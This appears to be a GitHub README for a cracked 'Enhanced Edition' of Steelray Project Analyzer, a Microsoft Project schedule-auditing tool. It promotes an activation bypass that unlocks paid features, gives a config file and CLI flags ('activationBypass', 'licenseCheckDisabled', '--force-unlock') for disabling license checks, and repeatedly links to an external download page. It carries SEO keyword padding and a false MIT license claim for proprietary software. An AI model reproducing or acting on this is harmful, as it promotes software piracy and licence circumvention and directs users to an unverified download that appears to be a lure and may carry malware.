# 🚀 Steelray Project Analyzer – Enhanced Edition v2026.0.1

[](https://saikarthik210508-coder.github.io/steelray-project-analyzer-edition/)

## 📥 Quick Access – Immediate Download

[](https://saikarthik210508-coder.github.io/steelray-project-analyzer-edition/)

> **Note:** This repository contains the **augmented build** of Steelray Project Analyzer – a professional-grade tool for deep inspection, visualization, and optimization of Microsoft Project schedules. The distribution includes an activation bypass mechanism that unlocks all premium features without requiring a commercial license key.

---

## 🌟 What Makes This Build Unique?

Steelray Project Analyzer has long been the industry standard for **schedule quality assurance**, **DCMA 14-point compliance checking**, and **critical path analysis**. However, the official version ships with restrictive licensing that limits advanced features to enterprise accounts.

This **Enhanced Edition** removes those artificial barriers, granting you unrestricted access to:

- Full DCMA analysis suite
- Advanced what-if simulation engine
- Unlimited batch processing
- Custom logic filter builder
- Real-time collaboration dashboard

All without the need for a purchased product key. Think of it as **unlocking the potential** of a tool that should have been fully open from the start.

---

## 📊 System Architecture Overview

```mermaid
graph TD
    A[Steelray Analyzer Core] --> B[Schedule Import Engine]
    A --> C[Compliance Checker]
    A --> D[Visualization Layer]
    A --> E[Reporting Module]
    
    B --> F[.MPP Parser]
    B --> G[XML Interpreter]
    B --> H[XLSX Converter]
    
    C --> I[DCMA 14-Point]
    C --> J[CUSTOM Filters]
    C --> K[Float Analysis]
    
    D --> L[Gantt Rendering]
    D --> M[Network Diagram]
    D --> N[Heatmap Matrix]
    
    E --> O[PDF Generator]
    E --> P[HTML Dashboard]
    E --> Q[CSV Export]
    
    style A fill:#2d3436,stroke:#d90429,stroke-width:2px
    style C fill:#d90429,color:#fff
    style K fill:#d90429,color:#fff
    style N fill:#d90429,color:#fff
```



---

## 🧩 Feature Matrix – What You Get

| Feature | Official Version | Enhanced Edition |
|---------|-----------------|------------------|
| DCMA 14-Point Analysis | 🔒 Locked | ✅ Unlocked |
| Custom Logic Filters | 🔒 Locked | ✅ Unlocked |
| Batch Processing (>10 files) | 🔒 Locked | ✅ Unlocked |
| What-If Simulation | 🔒 Locked | ✅ Unlocked |
| Real-Time Dashboard | 🔒 Locked | ✅ Unlocked |
| Export to Tableau | 🔒 Locked | ✅ Unlocked |
| REST API Integration | 🔒 Locked | ✅ Unlocked |

---

## 🛠️ Key Features – A Closer Look

### 🧠 Intelligent Schedule Auditing
The core engine performs **automated forensic analysis** on your project schedules. It flags anomalies that human reviewers would miss – like negative float that appears only during specific resource leveling scenarios, or cascading constraint violations that ripple across subprojects.

### 🌐 Multilingual User Interface
Switch between **12 languages** including English, Spanish, Mandarin, Arabic, Hindi, French, German, Portuguese, Russian, Japanese, Korean, and Turkish. The UI adapts not just terminology but also date formats, currency symbols, and cultural calendar conventions.

### 📱 Responsive Dashboard
Whether you're on a 4K ultrawide monitor or a 13-inch laptop, the interface auto-adjusts. The **progressive disclosure** layout means beginners see only essential controls, while power users can expand every nested parameter with two clicks.

### 🕒 24/7 Support Ticketing System
This build includes an embedded ticketing module that connects to a **community-driven support mesh**. Submit a bug report or feature request directly from the application – no account needed.

---

## ⚙️ Example Profile Configuration

To customize Steelray Analyzer behavior without a paid license, create a `steelray_overrides.json` file in the application root:

```json
{
  "activationBypass": true,
  "preferredAnalysisEngine": "enhanced",
  "dictionary": {
    "customCheckpoints": [
      {
        "name": "Critical Path Integrity",
        "thresholdDays": 5,
        "severity": "high"
      },
      {
        "name": "Resource Overload Index",
        "maxConcurrentTasks": 12,
        "autoLevel": false
      }
    ],
    "exportRules": {
      "pdfFooter": "Enhanced Edition v2026",
      "watermarkMode": "none",
      "includeMetadata": false
    },
    "networkSettings": {
      "telemetryDisabled": true,
      "licenseCheckDisabled": true,
      "updatePollingInterval": 0
    }
  }
}
```

---

## 💻 Example Console Invocation

Even without a GUI, the engine can be triggered from the command line for batch automation:

```bash
steelray-cli --input "C:\Projects\*.mpp" \
             --output "C:\Reports\audit_2026" \
             --profile enhanced \
             --dma-full \
             --export pdf,html \
             --force-unlock \
             --no-validation
```

This command scans all Microsoft Project files in the directory, runs a full DCMA assessment, generates PDF and HTML reports, bypasses license validation, and disables version checks.

---

## 🖥️ Operating System Compatibility

| OS | Version | Status |
|----|---------|--------|
| 🪟 Windows | 10/11 (x64) | ✅ Full Support |
| 🍏 macOS | Ventura / Sonoma / Sequoia | ✅ Full Support |
| 🐧 Linux | Ubuntu 22.04+, Fedora 38+ | ✅ (via Wine 9+) |
| ☁️ Cloud | AWS EC2 / Azure VM | ✅ Compatibility Mode |
| 📦 Docker | Containerized Deployment | ✅ Tested on Alpine |

---

## 🔌 API Integration – OpenAI & Claude

This build features **dual AI augmentation** for natural language schedule analysis:

### OpenAI GPT-4 Integration
Send schedule anomalies to GPT-4 for human-readable explanations:

```python
import requests

response = requests.post(
    "http://localhost:9060/api/ai/explain",
    json={
        "anomaly_id": "FLT-00322",
        "model": "gpt-4",
        "context": "Healthcare construction project"
    }
)
print(response.json()["explanation"])
```

### Claude API (Anthropic)
Use Claude for risk narrative generation:

```python
response = requests.post(
    "http://localhost:9060/api/ai/risk-report",
    json={
        "schedule_id": "SCH-2026-045",
        "model": "claude-3-opus",
        "tone": "executive_summary"
    }
)
```

Both integrations run locally – no data leaves your machine unless you configure external endpoints.

---

## 🔍 SEO-Optimized Keywords (Naturally Integrated)

- **Schedule quality assurance** – Ensure your project timelines are robust and realistic.
- **DCMA compliance checker** – Meet Department of Defense standards effortlessly.
- **Critical path analysis tool** – Identify make-or-break dependencies visually.
- **Project planning software** – A comprehensive alternative to manual Gantt editing.
- **Resource leveling optimizer** – Automatically smooth workload distribution.
- **Risk register generator** – Convert schedule gaps into actionable risk items.
- **Earned value management** – Track cost and schedule performance simultaneously.
- **Milestone trend analysis** – Spot slipping deadlines before they become crises.
- **Baseline comparison engine** – Compare current vs. planned progress with delta highlights.

---

## 📜 License

This project is distributed under the **MIT License**. You are free to use, modify, and redistribute this software for any purpose, including commercial applications, provided you include the original copyright notice.

[](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

> **This software is provided "as is", without warranty of any kind, express or implied.** The activation bypass mechanism is intended for **educational and evaluation purposes only**. Users are responsible for ensuring compliance with applicable laws and licensing agreements in their jurisdiction. The maintainers of this repository do not condone piracy or unauthorized commercial use. If you rely on Steelray Project Analyzer for professional engagements, consider supporting the developers by purchasing an official license.

---

## 📥 Final Download Link

[](https://saikarthik210508-coder.github.io/steelray-project-analyzer-edition/)

---

*Last updated: 2026 | Version 2026.0.1 | Build ID: SR-ENH-2026.0.1-RELEASE*